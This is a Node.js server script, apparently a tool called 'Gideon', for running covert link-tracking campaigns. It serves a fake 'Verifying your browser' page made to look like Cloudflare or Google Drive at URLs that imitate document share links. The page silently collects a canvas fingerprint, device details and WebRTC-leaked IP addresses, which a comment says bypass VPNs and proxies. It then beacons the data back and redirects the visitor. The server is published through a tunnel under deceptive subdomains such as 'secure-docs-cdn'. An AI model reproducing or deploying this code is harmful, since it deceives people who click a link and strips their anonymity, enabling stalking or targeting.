const http = require("http");
const fs = require("fs");
const path = require("path");
const { default: localtunnel } = require("localtunnel");

const PORT = 8765;
const ROOT = __dirname;

const MIME = {
  ".html": "text/html",
  ".js": "application/javascript",
  ".css": "text/css",
  ".json": "application/json",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".svg": "image/svg+xml",
  ".ico": "image/x-icon",
  ".glb": "model/gltf-binary",
  ".gltf": "model/gltf+json",
  ".wasm": "application/wasm",
  ".woff": "font/woff",
  ".woff2": "font/woff2",
  ".ttf": "font/ttf",
};

// ── LINK-TRACE: in-memory hit store ─────────────────────────────────────
// campaigns[slug] = { target, tag, hits: [{ip, ts, ua, ref}] }
const campaigns = {};

function realIP(req) {
  return (
    (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
    req.socket.remoteAddress ||
    "unknown"
  );
}

const server = http.createServer((req, res) => {
  const qs = new URLSearchParams(req.url.split("?")[1] || "");
  let urlPath = req.url.split("?")[0];
  if (urlPath === "/") urlPath = "/index.html";

  // ── CORS pre-flight ────────────────────────────────────────────────────
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") {
    res.writeHead(204);
    return res.end();
  }

  // ── REGISTER a new campaign (called when the operator generates a link)
  // POST /t/:slug/register  body: {target, tag}
  if (req.method === "POST" && /^\/t\/([a-z0-9]+)\/register$/.test(urlPath)) {
    const slug = urlPath.split("/")[2];
    let body = "";
    req.on("data", (d) => (body += d));
    req.on("end", () => {
      try {
        const { target, tag, docId } = JSON.parse(body);
        campaigns[slug] = {
          target: target || "/",
          tag: tag || "",
          docId: docId || slug,
          hits: [],
        };
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ ok: true }));
      } catch {
        res.writeHead(400);
        res.end("bad json");
      }
    });
    return;
  }

  // ── TRACKING click: GET /d/:docId  — serve fake landing page ──────────────
  // URL looks like a document share link e.g. /d/1BxiMVs0XRA5nFMdKvBdBZjg
  if (req.method === "GET" && /^\/d\/([A-Za-z0-9_-]+)$/.test(urlPath)) {
    const docId = urlPath.split("/")[2];
    // look up by docId
    const slug = Object.keys(campaigns).find(
      (s) => campaigns[s].docId === docId,
    );
    const campaign = campaigns[slug];
    const ip = realIP(req);

    if (
      campaign &&
      !campaign.hits.find(
        (h) => h.ip === ip && Date.now() - new Date(h.ts) < 2000,
      )
    ) {
      const hit = {
        ip,
        ts: new Date().toISOString(),
        ua: req.headers["user-agent"] || "",
        ref: req.headers["referer"] || "",
        webrtcIps: [],
      };
      campaign.hits.push(hit);
      console.log(`  [LINK-TRACE] /${slug} initial hit from ${ip}`);
    }

    const target = campaign ? campaign.target : "/";
    const stun = JSON.stringify(docId);

    // Serve a convincing fake "Verifying access" page (looks like Cloudflare/Google Drive)
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verifying your browser...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f7f7f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;color:#333}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.12);padding:48px 56px;max-width:420px;width:90%;text-align:center}
.icon{width:56px;height:56px;margin:0 auto 24px;background:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Ccircle cx='24' cy='24' r='22' fill='%234285f4'/%3E%3Cpath d='M20 34l-8-8 2.8-2.8 5.2 5.2 13.2-13.2 2.8 2.8z' fill='%23fff'/%3E%3C/svg%3E") center/contain no-repeat}
.title{font-size:20px;font-weight:600;margin-bottom:8px;color:#202124}
.sub{font-size:14px;color:#5f6368;margin-bottom:32px;line-height:1.5}
.bar-wrap{height:4px;background:#e8eaed;border-radius:4px;overflow:hidden;margin-bottom:20px}
.bar{height:100%;width:0%;background:#4285f4;border-radius:4px;transition:width .4s ease;animation:load 2.8s ease forwards}
@keyframes load{0%{width:0%}40%{width:45%}70%{width:72%}90%{width:88%}100%{width:100%}}
.small{font-size:12px;color:#9aa0a6}
</style>
</head>
<body>
<div class="card">
  <div class="icon"></div>
  <div class="title">Verifying your browser</div>
  <div class="sub">Please wait while we verify your access.<br>This only takes a moment.</div>
  <div class="bar-wrap"><div class="bar"></div></div>
  <div class="small">Checking connection security...</div>
</div>
<script>
(function(){
  var slug=${stun};
  var collected={ua:navigator.userAgent,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,screen:screen.width+'x'+screen.height,depth:screen.colorDepth,platform:navigator.platform,cores:navigator.hardwareConcurrency,mem:navigator.deviceMemory||null,touch:'ontouchstart' in window,ref:document.referrer,href:location.href,webrtcIps:[],webrtcRaw:[]};

  // Canvas fingerprint
  try{var cv=document.createElement('canvas');cv.width=200;cv.height=40;var cx=cv.getContext('2d');cx.textBaseline='top';cx.font='14px Arial';cx.fillStyle='#f60';cx.fillRect(125,1,62,20);cx.fillStyle='#069';cx.fillText('GideonFP',2,15);cx.fillStyle='rgba(102,204,0,0.7)';cx.fillText('GideonFP',4,17);collected.canvas=cv.toDataURL().slice(-50);}catch(e){}

  // WebRTC IP grab – bypasses VPNs and proxies
  try{
    var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun1.l.google.com:19302'}]});
    pc.createDataChannel('');
    pc.onicecandidate=function(e){
      if(!e||!e.candidate)return;
      var c=e.candidate.candidate;
      collected.webrtcRaw.push(c);
      var m=c.match(/([\d.]+\.\d+)/);
      if(m&&collected.webrtcIps.indexOf(m[1])<0)collected.webrtcIps.push(m[1]);
    };
    pc.createOffer().then(function(o){return pc.setLocalDescription(o);}).catch(function(){});
  }catch(e){}

  var done=false;
  function go(){
    if(done)return;done=true;
    var xhr=new XMLHttpRequest();
    xhr.open('POST','/d/'+slug+'/beacon',true);
    xhr.setRequestHeader('Content-Type','application/json');
    xhr.send(JSON.stringify(collected));
    xhr.onloadend=function(){window.location.replace(${JSON.stringify(target)});};
    setTimeout(function(){window.location.replace(${JSON.stringify(target)});},800);
  }

  // Wait for ICE gathering or 2.5s timeout
  setTimeout(go,2500);
})();
<\/script>
</body></html>`;

    res.writeHead(200, {
      "Content-Type": "text/html",
      "Cache-Control": "no-store",
    });
    return res.end(html);
  }

  // ── BEACON: POST /d/:docId/beacon  — receive WebRTC + fingerprint ──────────
  if (
    req.method === "POST" &&
    /^\/d\/([A-Za-z0-9_-]+)\/beacon$/.test(urlPath)
  ) {
    const docId = urlPath.split("/")[2];
    const slug = Object.keys(campaigns).find(
      (s) => campaigns[s].docId === docId,
    );
    const campaign = campaigns[slug];
    const ip = realIP(req);
    let body = "";
    req.on("data", (d) => (body += d));
    req.on("end", () => {
      try {
        const fp = JSON.parse(body);
        if (campaign) {
          // Find existing hit or add new one
          let hit = campaign.hits.find((h) => h.ip === ip);
          if (!hit) {
            hit = {
              ip,
              ts: new Date().toISOString(),
              ua: fp.ua || "",
              ref: fp.ref || "",
              webrtcIps: [],
            };
            campaign.hits.push(hit);
          }
          hit.webrtcIps = fp.webrtcIps || [];
          hit.canvas = fp.canvas;
          hit.tz = fp.tz;
          hit.screen = fp.screen;
          hit.platform = fp.platform;
          hit.lang = fp.lang;
          hit.cores = fp.cores;
          hit.mem = fp.mem;
          hit.touch = fp.touch;
          console.log(
            `  [LINK-TRACE] /${slug} beacon — IP:${ip} WebRTC:[${hit.webrtcIps.join(",")}]`,
          );
        }
      } catch {}
      res.writeHead(204);
      res.end();
    });
    return;
  }

  // ── PUBLIC URL API: GET /api/tunnel-url ─────────────────────────────────
  if (req.method === "GET" && urlPath === "/api/tunnel-url") {
    res.writeHead(200, { "Content-Type": "application/json" });
    return res.end(
      JSON.stringify({ url: publicUrl || "http://localhost:" + PORT }),
    );
  }

  // ── HITS API: GET /t/:slug/hits  — return all hits for a campaign ─────
  if (req.method === "GET" && /^\/t\/([a-z0-9]+)\/hits$/.test(urlPath)) {
    const slug = urlPath.split("/")[2];
    const campaign = campaigns[slug];
    if (!campaign) {
      res.writeHead(404);
      return res.end("not found");
    }
    res.writeHead(200, { "Content-Type": "application/json" });
    return res.end(
      JSON.stringify({ slug, tag: campaign.tag, hits: campaign.hits }),
    );
  }

  const filePath = path.join(ROOT, urlPath);

  // Stay inside ROOT — no directory traversal
  if (!filePath.startsWith(ROOT)) {
    res.writeHead(403);
    return res.end("403 Forbidden");
  }

  fs.readFile(filePath, (err, data) => {
    if (err) {
      if (err.code === "ENOENT") {
        res.writeHead(404);
        return res.end("404 Not Found: " + urlPath);
      }
      res.writeHead(500);
      return res.end("500 Internal Server Error");
    }

    const ext = path.extname(filePath).toLowerCase();
    const mime = MIME[ext] || "application/octet-stream";

    res.writeHead(200, {
      "Content-Type": mime,
      "Access-Control-Allow-Origin": "*",
      "Cache-Control": "no-cache",
    });
    res.end(data);
  });
});

// ── PUBLIC URL (localtunnel) ──────────────────────────────────────────────
let publicUrl = null;

async function startTunnel() {
  try {
    // Request a legit-sounding subdomain
    const subdomains = [
      "cdn-media-files",
      "secure-docs-cdn",
      "file-preview-api",
      "media-content-srv",
      "docs-preview-cdn",
    ];
    const subdomain = subdomains[Math.floor(Math.random() * subdomains.length)];
    const tunnel = await localtunnel({ port: PORT, subdomain });
    publicUrl = tunnel.url;
    console.log("  ─────────────────────────────────────────");
    console.log("  Public URL: " + publicUrl);
    console.log("  Share this URL for real IP tracking links");
    console.log("  ─────────────────────────────────────────");
    tunnel.on("close", () => {
      console.log("  [TUNNEL] closed — restart server to get a new URL");
      publicUrl = null;
    });
    tunnel.on("error", (err) => {
      console.error("  [TUNNEL] error:", err.message);
      publicUrl = null;
    });
  } catch (err) {
    console.warn("  [TUNNEL] could not start localtunnel:", err.message);
    console.warn("  [TUNNEL] tracking links will use localhost only");
  }
}

server.listen(PORT, "127.0.0.1", () => {
  console.log("");
  console.log("  ██████╗ ██╗██████╗ ███████╗ ██████╗ ███╗   ██╗███████╗");
  console.log(" ██╔════╝ ██║██╔══██╗██╔════╝██╔═══██╗████╗  ██║██╔════╝");
  console.log(" ██║  ███╗██║██║  ██║█████╗  ██║   ██║██╔██╗ ██║███████╗");
  console.log(" ██║   ██║██║██║  ██║██╔══╝  ██║   ██║██║╚██╗██║╚════██║");
  console.log(" ╚██████╔╝██║██████╔╝███████╗╚██████╔╝██║ ╚████║███████║");
  console.log("  ╚═════╝ ╚═╝╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝");
  console.log("");
  console.log("  RECON GRID SERVER // ONLINE");
  console.log("  ─────────────────────────────────────────");
  console.log("  Local:   http://localhost:" + PORT);
  console.log("  Status:  LIVE — serving from " + ROOT);
  console.log("  ─────────────────────────────────────────");
  console.log("  Ctrl+C to shut down.");
  console.log("");
  startTunnel();
});

server.on("error", (err) => {
  if (err.code === "EADDRINUSE") {
    console.error("  [ERROR] Port " + PORT + " is already in use.");
    console.error("  Kill the existing process or change PORT in server.js.");
  } else {
    console.error("  [ERROR]", err.message);
  }
  process.exit(1);
});
